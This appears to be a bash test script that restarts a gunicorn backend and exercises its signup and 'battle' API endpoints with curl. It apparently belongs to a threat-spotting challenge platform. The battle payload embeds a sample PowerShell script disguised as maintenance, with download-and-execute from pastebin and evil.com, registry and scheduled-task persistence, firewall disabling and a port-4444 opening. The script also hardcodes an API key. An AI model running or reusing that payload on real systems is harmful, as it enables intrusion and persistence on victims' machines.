#!/bin/bash
killall -9 gunicorn 2>/dev/null
sleep 1
cd /root/.openclaw/workspace/glomz/backend
/usr/local/bin/gunicorn -w 4 -b 127.0.0.1:5000 app:app --daemon --access-logfile /dev/null --error-logfile /var/log/glomz-error.log --timeout 120
sleep 2
echo "=== Health ==="
curl -s http://127.0.0.1:5000/api/health
echo ""
echo "=== Test signup ==="
curl -s -X POST http://127.0.0.1:5000/api/users/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"test3@test.com","agent_name":"RoastBot3","name":"Test"}'
echo ""
echo "=== Test signup with existing user ==="
curl -s -X POST http://127.0.0.1:5000/api/users/signup \
  -H "Content-Type: application/json" \
  -d '{"email":"jeff@cyborama.com","agent_name":"CyberHound2","name":"Jeff"}'
echo ""
echo "=== Create battle ==="
curl -s -X POST http://127.0.0.1:5000/api/octagon/battles \
  -H "Content-Type: application/json" \
  -H "X-API-Key: glomz_mn6Om616Yt9MzADTmf5VwTm6jVAoxVHNcw2Lj-Oomsk" \
  -d '{"title":"LOTL PowerShell Daily Maintenance - Find The Threats","content":"# Daily system maintenance v2.1 - DO NOT REMOVE\n$p = \"$env:ProgramData\\Microsoft\\Windows\\start menu\\programs\\startup\\update-helper.ps1\"\n$w = New-Object System.Net.WebClient\n$u = \"http://pastebin.com/raw/xK9mQ\"\n$d = $w.DownloadString($u)\nInvoke-Expression ($d)\nschtasks /create /tn \"WinUpdateService\" /tr \"powershell -w hidden -f $p\" /sc onlogon /rl highest\nSet-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name \"SvchostHelper\" -Value \"powershell -ep bypass -exec bypass $p\"\nCertUtil -urlcache -split -f \"https://evil.com/payload.dll\" \"$env:temp\\svchost.exe\"\nStart-Process -FilePath \"$env:temp\\svchost.exe\" -WindowStyle Hidden\nRemove-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\" -Name \"C:\\Temp\" -ErrorAction SilentlyContinue\nGet-WmiObject -List | Where-Object { $_.Name -match \"Win32\" } | Select-Object -First 10\nnetsh advfirewall set allprofiles state off\nNew-NetFirewallRule -DisplayName \"SvcHost\" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444","description":"20 lines of LOTL malware disguised as daily maintenance. Find all LOLBAS abuse, persistence, firewall changes.","type":"code","tags":["powershell","lotl","lolbas","persistence"]}'
echo ""
